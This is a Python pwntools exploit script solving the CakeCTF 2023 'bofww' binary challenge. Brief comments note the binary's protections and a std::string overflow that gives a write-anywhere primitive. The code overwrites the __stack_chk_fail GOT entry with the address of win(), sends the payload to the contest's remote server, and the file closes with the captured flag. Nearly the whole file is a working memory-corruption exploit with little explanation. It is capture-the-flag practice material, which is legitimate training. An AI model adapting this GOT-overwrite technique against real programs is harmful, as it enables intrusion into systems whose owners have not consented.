

from pwn import *


'''
PARTIAL RELRO
ASLR
NO PIE


overflow   in  std::basic_string : 
  0x00000000004013b4 <+164>:   call   0x4011a0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc@plt>


write everywhere privitive =>

address offset : 304
value   offset  : 0

write win() at 0x404050 <__stack_chk_fail@got.plt>

'''


#p = process("./bofww")
p = remote("bofww.2023.cakectf.com" ,9002)
username = p64(0x00000000004012fa) + b'a'*296 + p64(0x404050)+ b'D'*96 
p.sendline(username)
p.sendline(b'10')
p.interactive()


# CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}